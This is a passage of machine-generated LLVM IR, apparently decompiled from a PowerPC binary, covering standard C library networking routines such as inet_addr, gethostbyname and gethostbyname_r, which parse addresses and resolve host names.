  %storemerge = phi i32 [ %v1_1000da5c, %dec_label_pc_1000da54 ], [ %v2_1000da6c, %dec_label_pc_1000da6c ]
  store i32 %storemerge, i32* %r11.global-to-local, align 4
  %v2_1000da70 = icmp ugt i32 %storemerge, 255
  %v3_1000da70 = icmp eq i32 %storemerge, 255
  store i1 %v3_1000da70, i1* %cr7_eq.global-to-local, align 1
  %v0_1000da74 = load i32, i32* @r3, align 4
  %v1_1000da74 = add i32 %v0_1000da74, 1
  store i32 %v1_1000da74, i32* @r3, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  br i1 %v2_1000da70, label %dec_label_pc_1000dacc, label %dec_label_pc_1000da80

dec_label_pc_1000da80:                            ; preds = %dec_label_pc_1000da70, %dec_label_pc_1000da08
  %v0_1000da20 = phi i32 [ %storemerge, %dec_label_pc_1000da70 ], [ 0, %dec_label_pc_1000da08 ]
  %v0_1000da80 = phi i32 [ %v1_1000da74, %dec_label_pc_1000da70 ], [ %v0_1000da805, %dec_label_pc_1000da08 ]
  %v1_1000da80 = inttoptr i32 %v0_1000da80 to i8*
  %v2_1000da80 = load i8, i8* %v1_1000da80, align 1
  %v3_1000da80 = zext i8 %v2_1000da80 to i32
  store i32 %v3_1000da80, i32* %r0.global-to-local, align 4
  %v3_1000da84 = icmp eq i8 %v2_1000da80, 0
  store i1 %v3_1000da84, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000da84, label %dec_label_pc_1000da90, label %dec_label_pc_1000da1c

dec_label_pc_1000da90:                            ; preds = %dec_label_pc_1000da64, %dec_label_pc_1000da80, %dec_label_pc_1000da68
  %v0_1000da90 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000da90 = icmp eq i32 %v0_1000da90, 0
  store i1 %v3_1000da90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000da90, label %dec_label_pc_1000dacc, label %dec_label_pc_1000da98

dec_label_pc_1000da98:                            ; preds = %dec_label_pc_1000da90
  %v0_1000da98 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000da98 = icmp eq i32 %v0_1000da98, 0
  store i1 %v3_1000da98, i1* %cr7_eq.global-to-local, align 1
  %v0_1000daa8.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v3_1000da98, label %dec_label_pc_1000daa4, label %dec_label_pc_1000daa0

dec_label_pc_1000daa0:                            ; preds = %dec_label_pc_1000da98
  %v1_1000daa0 = mul i32 %v0_1000daa8.pre, 256
  store i32 %v1_1000daa0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000daa4

dec_label_pc_1000daa4:                            ; preds = %dec_label_pc_1000da98, %dec_label_pc_1000daa0
  %v0_1000daa8 = phi i32 [ %v1_1000daa0, %dec_label_pc_1000daa0 ], [ %v0_1000daa8.pre, %dec_label_pc_1000da98 ]
  %v0_1000daa4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000daa4 = icmp eq i32 %v0_1000daa4, 46
  store i1 %v3_1000daa4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000daa8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000daa8 = or i32 %v1_1000daa8, %v0_1000daa8
  store i32 %v2_1000daa8, i32* %r6.global-to-local, align 4
  br i1 %v3_1000daa4, label %dec_label_pc_1000dab0, label %dec_label_pc_1000dac4

dec_label_pc_1000dab0:                            ; preds = %dec_label_pc_1000daa4
  %v3_1000dab0 = icmp eq i32 %v0_1000da98, 3
  store i1 %v3_1000dab0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000dab4 = add i32 %v0_1000da98, 1
  store i32 %v1_1000dab4, i32* %r5.global-to-local, align 4
  br i1 %v3_1000dab0, label %dec_label_pc_1000dacc, label %dec_label_pc_1000dabc

dec_label_pc_1000dabc:                            ; preds = %dec_label_pc_1000dab0
  %v0_1000dabc = load i32, i32* @r3, align 4
  %v1_1000dabc = add i32 %v0_1000dabc, 1
  store i32 %v1_1000dabc, i32* @r3, align 4
  br label %dec_label_pc_1000d9cc

dec_label_pc_1000dac4:                            ; preds = %dec_label_pc_1000daa4
  %v3_1000dac4 = icmp eq i32 %v0_1000daa4, 0
  store i1 %v3_1000dac4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dac4, label %dec_label_pc_1000dad0, label %dec_label_pc_1000dacc

dec_label_pc_1000dacc:                            ; preds = %dec_label_pc_1000dab0, %dec_label_pc_1000da90, %dec_label_pc_1000da48, %dec_label_pc_1000da70, %dec_label_pc_1000dac4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000dad0

dec_label_pc_1000dad0:                            ; preds = %dec_label_pc_1000dac4, %dec_label_pc_1000dacc
  %v0_1000dad0 = phi i32 [ %v2_1000daa8, %dec_label_pc_1000dac4 ], [ -1, %dec_label_pc_1000dacc ]
  ret i32 %v0_1000dad0

; uselistorder directives
  uselistorder i32 %v1_1000dabc, { 1, 0 }
  uselistorder i32 %v1_1000daa0, { 1, 0 }
  uselistorder i32 %v0_1000daa8.pre, { 1, 0 }
  uselistorder i32 %v3_1000da80, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1, 3 }
  uselistorder i32 %v5_1000da1c, { 1, 0, 2 }
  uselistorder i32 %v0_1000da08, { 1, 0 }
  uselistorder i1 %v3_1000d9ec, { 1, 0 }
  uselistorder i32 %v0_1000d9e0, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 3, 4, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 8, 9, 10, 11, 12, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000dad0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dacc, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000daa4, { 1, 0 }
  uselistorder label %dec_label_pc_1000da90, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000da70, { 1, 0 }
  uselistorder label %dec_label_pc_1000da08, { 2, 0, 1 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000dae8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000dae8, i32* @r4, align 4
  store i32 268491508, i32* @lr, align 4
  %v1_1000daf0 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000daf0 = call i32 @inet_aton(i8* %v1_1000daf0)
  %v3_1000daf4 = icmp eq i32 %v2_1000daf0, 0
  br i1 %v3_1000daf4, label %dec_label_pc_1000db04, label %dec_label_pc_1000db00

dec_label_pc_1000db00:                            ; preds = %entry
  %v3_1000db00 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000db04

dec_label_pc_1000db04:                            ; preds = %entry, %dec_label_pc_1000db00
  %v0_1000db10 = phi i32 [ -1, %entry ], [ %v3_1000db00, %dec_label_pc_1000db00 ]
  ret i32 %v0_1000db10

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000db04, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000db28 = call i32 @__GI___h_errno_location()
  %v2_1000db38 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268491600, i32* @lr, align 4
  %v7_1000db4c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_10033828.420, i32 ptrtoint (i32* @global_var_1003365c.421 to i32), i32 460, i32 %v2_1000db38, i32 %v0_1000db28)
  %v3_1000db54 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000db54
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000db6c = load i32, i32* @lr, align 4
  store i32 %v0_1000db6c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000db74 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* @r20, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* @r29, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000db94 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000db94, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000db74, label %dec_label_pc_1000de98, label %dec_label_pc_1000dba0

dec_label_pc_1000dba0:                            ; preds = %entry
  %v0_1000dba0 = call i32 @__errno_location()
  store i32 %v0_1000dba0, i32* %r3.global-to-local, align 4
  %v1_1000dba8 = inttoptr i32 %v0_1000dba0 to i32*
  %v2_1000dba8 = load i32, i32* %v1_1000dba8, align 4
  store i32 %v2_1000dba8, i32* @r27, align 4
  store i32 %v0_1000dba0, i32* %r28.global-to-local, align 4
  %v0_1000dbb0 = load i32, i32* @r31, align 4
  store i32 %v0_1000dbb0, i32* %v1_1000dba8, align 4
  %v0_1000dbb4 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000dbb8 = load i32, i32* @r23, align 4
  store i32 %v0_1000dbb8, i32* %r3.global-to-local, align 4
  %v0_1000dbbc = load i32, i32* @r30, align 4
  %v0_1000dbc0 = load i32, i32* @r29, align 4
  %v0_1000dbc4 = load i32, i32* @r20, align 4
  %v0_1000dbc8 = load i32, i32* @r24, align 4
  store i32 268491728, i32* @lr, align 4
  %v7_1000dbcc = call i32 @__get_hosts_byname_r(i32 %v0_1000dbb8, i32 2, i32 %v0_1000dbb4, i32 %v0_1000dbbc, i32 %v0_1000dbc0, i32 %v0_1000dbc4, i32 %v0_1000dbc8)
  store i32 %v7_1000dbcc, i32* %r3.global-to-local, align 4
  %v3_1000dbd0 = icmp eq i32 %v7_1000dbcc, 0
  br i1 %v3_1000dbd0, label %dec_label_pc_1000de98, label %dec_label_pc_1000dbd8

dec_label_pc_1000dbd8:                            ; preds = %dec_label_pc_1000dba0
  %v0_1000dbd8 = load i32, i32* @r24, align 4
  %v1_1000dbd8 = inttoptr i32 %v0_1000dbd8 to i32*
  %v2_1000dbd8 = load i32, i32* %v1_1000dbd8, align 4
  store i32 %v2_1000dbd8, i32* %r0.global-to-local, align 4
  %v3_1000dbdc = icmp eq i32 %v2_1000dbd8, 1
  br i1 %v3_1000dbdc, label %dec_label_pc_1000dc00, label %dec_label_pc_1000dbe4

dec_label_pc_1000dbe4:                            ; preds = %dec_label_pc_1000dbd8
  %v3_1000dbe4 = icmp eq i32 %v2_1000dbd8, 4
  br i1 %v3_1000dbe4, label %dec_label_pc_1000dc00, label %dec_label_pc_1000dbec

dec_label_pc_1000dbec:                            ; preds = %dec_label_pc_1000dbe4
  %v3_1000dbec = icmp eq i32 %v2_1000dbd8, -1
  br i1 %v3_1000dbec, label %dec_label_pc_1000dbf4, label %dec_label_pc_1000de98

dec_label_pc_1000dbf4:                            ; preds = %dec_label_pc_1000dbec
  %v0_1000dbf4 = load i32, i32* @r28, align 4
  %v1_1000dbf4 = inttoptr i32 %v0_1000dbf4 to i32*
  %v2_1000dbf4 = load i32, i32* %v1_1000dbf4, align 4
  store i32 %v2_1000dbf4, i32* %r0.global-to-local, align 4
  %v3_1000dbf8 = icmp eq i32 %v2_1000dbf4, 2
  br i1 %v3_1000dbf8, label %dec_label_pc_1000dc00, label %dec_label_pc_1000de98

dec_label_pc_1000dc00:                            ; preds = %dec_label_pc_1000dbf4, %dec_label_pc_1000dbe4, %dec_label_pc_1000dbd8
  %v0_1000dc00 = load i32, i32* @r30, align 4
  %v1_1000dc00 = sub i32 0, %v0_1000dc00
  store i32 %v1_1000dc00, i32* %r0.global-to-local, align 4
  %v0_1000dc04 = load i32, i32* @r27, align 4
  %v1_1000dc04 = load i32, i32* @r28, align 4
  %v2_1000dc04 = inttoptr i32 %v1_1000dc04 to i32*
  store i32 %v0_1000dc04, i32* %v2_1000dc04, align 4
  %v0_1000dc08 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dc08 = urem i32 %v0_1000dc08, 4
  store i32 %v1_1000dc08, i32* %r0.global-to-local, align 4
  %v3_1000dc08 = icmp eq i32 %v1_1000dc08, 0
  %v0_1000dc20.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000dc08, label %dec_label_pc_1000dc20, label %dec_label_pc_1000dc10

dec_label_pc_1000dc10:                            ; preds = %dec_label_pc_1000dc00
  %v2_1000dc10 = icmp ult i32 %v0_1000dc20.pre, %v1_1000dc08
  br i1 %v2_1000dc10, label %dec_label_pc_1000de94, label %dec_label_pc_1000dc18

dec_label_pc_1000dc18:                            ; preds = %dec_label_pc_1000dc10
  %v2_1000dc18 = sub i32 %v0_1000dc20.pre, %v1_1000dc08
  store i32 %v2_1000dc18, i32* @r29, align 4
  %v0_1000dc1c = load i32, i32* @r30, align 4
  %v2_1000dc1c = add i32 %v0_1000dc1c, %v1_1000dc08
  store i32 %v2_1000dc1c, i32* @r30, align 4
  br label %dec_label_pc_1000dc20

dec_label_pc_1000dc20:                            ; preds = %dec_label_pc_1000dc00, %dec_label_pc_1000dc18
  %v0_1000dc20 = phi i32 [ %v2_1000dc18, %dec_label_pc_1000dc18 ], [ %v0_1000dc20.pre, %dec_label_pc_1000dc00 ]
  store i32 -1, i32* @r19, align 4
  %v1_1000dc28 = load i32, i32* @r24, align 4
  %v2_1000dc28 = inttoptr i32 %v1_1000dc28 to i32*
  store i32 -1, i32* %v2_1000dc28, align 4
  %tmp29 = icmp ult i32 %v0_1000dc20, 4
  br i1 %tmp29, label %dec_label_pc_1000de94, label %dec_label_pc_1000dc30

dec_label_pc_1000dc30:                            ; preds = %dec_label_pc_1000dc20
  %v0_1000dc30 = load i32, i32* @r29, align 4
  %v1_1000dc30 = add i32 %v0_1000dc30, -4
  store i32 %v1_1000dc30, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000dc30, 8
  br i1 %tmp30, label %dec_label_pc_1000de94, label %dec_label_pc_1000dc3c

dec_label_pc_1000dc3c:                            ; preds = %dec_label_pc_1000dc30
  %v1_1000dc3c = add i32 %v0_1000dc30, -12
  store i32 %v1_1000dc3c, i32* %r0.global-to-local, align 4
  %v0_1000dc40 = load i32, i32* @r30, align 4
  %v1_1000dc40 = add i32 %v0_1000dc40, 4
  store i32 %v1_1000dc40, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000dc4c = inttoptr i32 %v1_1000dc40 to i32*
  store i32 %v0_1000dc40, i32* %v3_1000dc4c, align 4
  %v0_1000dc50 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000dc50 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000dc50 = add i32 %v1_1000dc50, 4
  %v3_1000dc50 = inttoptr i32 %v2_1000dc50 to i32*
  store i32 %v0_1000dc50, i32* %v3_1000dc50, align 4
  %tmp31 = icmp ult i32 %v1_1000dc3c, 32
  br i1 %tmp31, label %dec_label_pc_1000de94, label %dec_label_pc_1000dc58

dec_label_pc_1000dc58:                            ; preds = %dec_label_pc_1000dc3c
  %v0_1000dc58 = load i32, i32* @r29, align 4
  %v1_1000dc58 = add i32 %v0_1000dc58, -44
  %tmp32 = icmp ult i32 %v1_1000dc58, 256
  br i1 %tmp32, label %dec_label_pc_1000de94, label %dec_label_pc_1000dc64

dec_label_pc_1000dc64:                            ; preds = %dec_label_pc_1000dc58
  %v0_1000dc64 = load i32, i32* @r30, align 4
  %v1_1000dc64 = add i32 %v0_1000dc64, 44
  store i32 %v1_1000dc64, i32* @r31, align 4
  %v0_1000dc68 = load i32, i32* @r23, align 4
  store i32 %v0_1000dc68, i32* @r4, align 4
  %v1_1000dc70 = add i32 %v0_1000dc64, 12
  store i32 %v1_1000dc70, i32* @r21, align 4
  store i32 %v1_1000dc64, i32* %r3.global-to-local, align 4
  store i32 268491900, i32* @lr, align 4
  %v3_1000dc78 = call i32 @strncpy(i32 %v1_1000dc64, i32 %v0_1000dc68, i32 %v1_1000dc58)
  %v0_1000dc7c = load i32, i32* @r31, align 4
  %v1_1000dc7c = load i32, i32* @r30, align 4
  %v2_1000dc7c = add i32 %v1_1000dc7c, 12
  %v3_1000dc7c = inttoptr i32 %v2_1000dc7c to i32*
  store i32 %v0_1000dc7c, i32* %v3_1000dc7c, align 4
  %v0_1000dc80 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000dc80 = load i32, i32* @r21, align 4
  %v2_1000dc80 = add i32 %v1_1000dc80, 4
  %v3_1000dc80 = inttoptr i32 %v2_1000dc80 to i32*
  store i32 %v0_1000dc80, i32* %v3_1000dc80, align 4
  %v0_1000dc84 = load i32, i32* @r23, align 4
  store i32 %v0_1000dc84, i32* %r3.global-to-local, align 4
  %v0_1000dc88 = load i32, i32* @r30, align 4
  store i32 %v0_1000dc88, i32* @r4, align 4
  store i32 268491920, i32* @lr, align 4
  %v2_1000dc8c = inttoptr i32 %v0_1000dc84 to i8*
  %v3_1000dc8c = call i32 @inet_aton(i8* %v2_1000dc8c)
  store i32 %v3_1000dc8c, i32* %r3.global-to-local, align 4
  store i32 %v3_1000dc8c, i32* @r22, align 4
  %v3_1000dc90 = icmp eq i32 %v3_1000dc8c, 0
  br i1 %v3_1000dc90, label %dec_label_pc_1000dcc4, label %dec_label_pc_1000dc98

dec_label_pc_1000dc98:                            ; preds = %dec_label_pc_1000dc64
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000dca0 = load i32, i32* @r26, align 4
  %v2_1000dca0 = add i32 %v1_1000dca0, 8
  %v3_1000dca0 = inttoptr i32 %v2_1000dca0 to i32*
  store i32 2, i32* %v3_1000dca0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000dca8 = load i32, i32* @r31, align 4
  %v1_1000dca8 = load i32, i32* @r26, align 4
  %v2_1000dca8 = inttoptr i32 %v1_1000dca8 to i32*
  store i32 %v0_1000dca8, i32* %v2_1000dca8, align 4
  %v0_1000dcac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dcac = load i32, i32* @r26, align 4
  %v2_1000dcac = add i32 %v1_1000dcac, 12
  %v3_1000dcac = inttoptr i32 %v2_1000dcac to i32*
  store i32 %v0_1000dcac, i32* %v3_1000dcac, align 4
  %v0_1000dcb0 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000dcb0 = load i32, i32* @r26, align 4
  %v2_1000dcb0 = add i32 %v1_1000dcb0, 16
  %v3_1000dcb0 = inttoptr i32 %v2_1000dcb0 to i32*
  store i32 %v0_1000dcb0, i32* %v3_1000dcb0, align 4
  %v0_1000dcb4 = load i32, i32* @r21, align 4
  %v1_1000dcb4 = load i32, i32* @r26, align 4
  %v2_1000dcb4 = add i32 %v1_1000dcb4, 4
  %v3_1000dcb4 = inttoptr i32 %v2_1000dcb4 to i32*
  store i32 %v0_1000dcb4, i32* %v3_1000dcb4, align 4
  %v0_1000dcb8 = load i32, i32* @r26, align 4
  %v1_1000dcb8 = load i32, i32* @r20, align 4
  %v2_1000dcb8 = inttoptr i32 %v1_1000dcb8 to i32*
  store i32 %v0_1000dcb8, i32* %v2_1000dcb8, align 4
  %v0_1000dcbc = load i32, i32* %r28.global-to-local, align 4
  %v1_1000dcbc = load i32, i32* @r24, align 4
  %v2_1000dcbc = inttoptr i32 %v1_1000dcbc to i32*
  store i32 %v0_1000dcbc, i32* %v2_1000dcbc, align 4
  br label %dec_label_pc_1000de98

dec_label_pc_1000dcc4:                            ; preds = %dec_label_pc_1000dc64
  store i32 268491980, i32* @lr, align 4
  %v0_1000dcc8 = call i32 @__open_nameservers()
  %v2_1000dcd0 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000dcd0, i32* %r28.global-to-local, align 4
  store i32 %v2_1000dcd0, i32* %r3.global-to-local, align 4
  %v4_1000dce4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-116, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  store i32 ptrtoint (i32* @global_var_1002eef0.422 to i32), i32* %r3.global-to-local, align 4
  store i32 268492016, i32* @lr, align 4
  %v1_1000dcec = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  %v3_1000dcf4 = load i32, i32* @global_var_1002f0a0.423, align 4
  store i32 %v3_1000dcf4, i32* @r29, align 4
  store i32 %v2_1000dcd0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268492036, i32* @lr, align 4
  %v0_1000dd00 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000dd08 = load i32, i32* @r23, align 4
  store i32 %v0_1000dd08, i32* %r3.global-to-local, align 4
  %v0_1000dd0c = load i32, i32* @r29, align 4
  %v2_1000dd18 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000dd1c = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000dd20 = load i32, i32* @r22, align 4
  store i32 268492080, i32* @lr, align 4
  %v6_1000dd2c = inttoptr i32 %v0_1000dd08 to i8*
  %v7_1000dd2c = call i32 @__dns_lookup(i8* %v6_1000dd2c, i32 1, i32 %v0_1000dd0c, i32 ptrtoint (i32* @global_var_10033c2c.424 to i32), i32 %v2_1000dd18, i32 %v2_1000dd1c)
  store i32 %v7_1000dd2c, i32* %r3.global-to-local, align 4
  %v1_1000dd30 = icmp slt i32 %v7_1000dd2c, 0
  br i1 %v1_1000dd30, label %dec_label_pc_1000de78, label %dec_label_pc_1000dd38

dec_label_pc_1000dd38:                            ; preds = %dec_label_pc_1000dcc4
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000dd40 = add i32 %tmp19, 4
  %v2_1000dd44 = mul i32 %v0_1000dd20, %v1_1000dd40
  %v1_1000dd48 = add i32 %v2_1000dd44, 256
  %v1_1000dd4c = load i32, i32* @r27, align 4
  %v3_1000dd4c = icmp ugt i32 %v1_1000dd48, %v1_1000dd4c
  br i1 %v3_1000dd4c, label %dec_label_pc_1000dd54, label %dec_label_pc_1000dd70

dec_label_pc_1000dd54:                            ; preds = %dec_label_pc_1000dd38
  %v3_1000dd54 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000dd54, i32* @r3, align 4
  store i32 268492124, i32* @lr, align 4
  %v0_1000dd58 = call i32 @free()
  %v3_1000dd5c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000dd5c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000dd64.425 to i32), i32* @lr, align 4
  %v0_1000dd60 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000dd68 = load i32, i32* @r19, align 4
  %v1_1000dd68 = load i32, i32* @r24, align 4
  %v2_1000dd68 = inttoptr i32 %v1_1000dd68 to i32*
  store i32 %v0_1000dd68, i32* %v2_1000dd68, align 4
  br label %dec_label_pc_1000de98

dec_label_pc_1000dd70:                            ; preds = %dec_label_pc_1000dd38
  %v3_1000dd70 = icmp eq i32 %v0_1000dd20, 0
  br i1 %v3_1000dd70, label %dec_label_pc_1000dd70.dec_label_pc_1000de14_crit_edge, label %dec_label_pc_1000dd78

dec_label_pc_1000dd70.dec_label_pc_1000de14_crit_edge: ; preds = %dec_label_pc_1000dd70
  %v0_1000de1c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000de14

dec_label_pc_1000dd78:                            ; preds = %dec_label_pc_1000dd70
  %v2_1000dd78 = mul i32 %v0_1000dd20, %tmp19
  store i32 %v2_1000dd78, i32* @r5, align 4
  %v0_1000dd7c = load i32, i32* @r30, align 4
  %v1_1000dd7c = add i32 %v0_1000dd7c, 36
  store i32 %v1_1000dd7c, i32* %r3.global-to-local, align 4
  %v0_1000dd80 = load i32, i32* @r31, align 4
  store i32 268492168, i32* @lr, align 4
  %v2_1000dd84 = call i32 @memmove(i32 %v1_1000dd7c, i32 %v0_1000dd80)
  store i32 %v2_1000dd84, i32* %r3.global-to-local, align 4
  store i32 %v2_1000dd78, i32* %r0.global-to-local, align 4
  %v0_1000dd94 = load i32, i32* @r30, align 4
  %v1_1000dd94 = load i32, i32* @r31, align 4
  %v3_1000dd94 = add i32 %v1_1000dd94, %v2_1000dd78
  %v4_1000dd94 = inttoptr i32 %v3_1000dd94 to i32*
  store i32 %v0_1000dd94, i32* %v4_1000dd94, align 4
  %v0_1000dd98 = load i32, i32* @r31, align 4
  %v1_1000dd98 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000dd98 = add i32 %v1_1000dd98, %v0_1000dd98
  store i32 %v2_1000dd98, i32* @r25, align 4
  %v1_1000dda0 = add i32 %v0_1000dd20, -1
  store i32 %v1_1000dda0, i32* %r11.global-to-local, align 4
  %v1_1000dda4 = add i32 %v0_1000dd20, 1
  %v2_1000dda8 = icmp sgt i32 %v1_1000dda0, -1
  store i32 %v1_1000dda4, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000dda8, label %dec_label_pc_1000ddd8.preheader, label %dec_label_pc_1000ddb4

dec_label_pc_1000ddb4:                            ; preds = %dec_label_pc_1000dd78
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ddd8.preheader

dec_label_pc_1000ddd8.preheader:                  ; preds = %dec_label_pc_1000ddb4, %dec_label_pc_1000dd78
  %v0_1000dde06 = phi i32 [ 1, %dec_label_pc_1000ddb4 ], [ %v1_1000dda4, %dec_label_pc_1000dd78 ]
  %v1_1000ddd83 = mul i32 %v1_1000dda0, 4
  store i32 %v1_1000ddd83, i32* %r0.global-to-local, align 4
  %v2_1000dddc5 = add i32 %v2_1000dd98, %v1_1000ddd83
  store i32 %v2_1000dddc5, i32* @r10, align 4
  %v1_1000dde07 = add i32 %v0_1000dde06, -1
  store i32 %v1_1000dde07, i32* %ctr.global-to-local, align 4
  %v2_1000dde08 = icmp eq i32 %v1_1000dde07, 0
  br i1 %v2_1000dde08, label %dec_label_pc_1000dde4, label %dec_label_pc_1000ddc0

dec_label_pc_1000ddc0:                            ; preds = %dec_label_pc_1000ddd8.preheader, %dec_label_pc_1000ddc0.dec_label_pc_1000ddc0_crit_edge
  %v1_1000ddd4 = phi i32 [ %v2_1000dddc, %dec_label_pc_1000ddc0.dec_label_pc_1000ddc0_crit_edge ], [ %v2_1000dddc5, %dec_label_pc_1000ddd8.preheader ]
  %v0_1000ddcc = phi i32 [ %v0_1000ddcc.pre, %dec_label_pc_1000ddc0.dec_label_pc_1000ddc0_crit_edge ], [ %v0_1000dd98, %dec_label_pc_1000ddd8.preheader ]
  %v0_1000ddc4 = phi i32 [ %v0_1000ddd8, %dec_label_pc_1000ddc0.dec_label_pc_1000ddc0_crit_edge ], [ %v1_1000dda0, %dec_label_pc_1000ddd8.preheader ]
  %v2_1000ddc4 = mul i32 %v0_1000ddc4, %tmp19
  %v1_1000ddc8 = add i32 %v0_1000ddc4, -1
  store i32 %v1_1000ddc8, i32* %r11.global-to-local, align 4
  %v2_1000ddcc = add i32 %v0_1000ddcc, -8
  %v1_1000ddd0 = add i32 %v2_1000ddcc, %v2_1000ddc4
  %v2_1000ddd4 = add i32 %v1_1000ddd4, 4
  %v3_1000ddd4 = inttoptr i32 %v2_1000ddd4 to i32*
  store i32 %v1_1000ddd0, i32* %v3_1000ddd4, align 4
  %v0_1000ddd8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ddd8 = mul i32 %v0_1000ddd8, 4
  store i32 %v1_1000ddd8, i32* %r0.global-to-local, align 4
  %v1_1000dddc = load i32, i32* @r25, align 4
  %v2_1000dddc = add i32 %v1_1000dddc, %v1_1000ddd8
  store i32 %v2_1000dddc, i32* @r10, align 4
  %v0_1000dde0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dde0 = add i32 %v0_1000dde0, -1
  store i32 %v1_1000dde0, i32* %ctr.global-to-local, align 4
  %v2_1000dde0 = icmp eq i32 %v1_1000dde0, 0
  br i1 %v2_1000dde0, label %dec_label_pc_1000dde4, label %dec_label_pc_1000ddc0.dec_label_pc_1000ddc0_crit_edge

dec_label_pc_1000ddc0.dec_label_pc_1000ddc0_crit_edge: ; preds = %dec_label_pc_1000ddc0
  %v0_1000ddcc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ddc0

dec_label_pc_1000dde4:                            ; preds = %dec_label_pc_1000ddc0, %dec_label_pc_1000ddd8.preheader
  %v1_1000ddf0 = phi i32 [ %v2_1000dd98, %dec_label_pc_1000ddd8.preheader ], [ %v1_1000dddc, %dec_label_pc_1000ddc0 ]
  store i32 0, i32* %r0.global-to-local, align 4
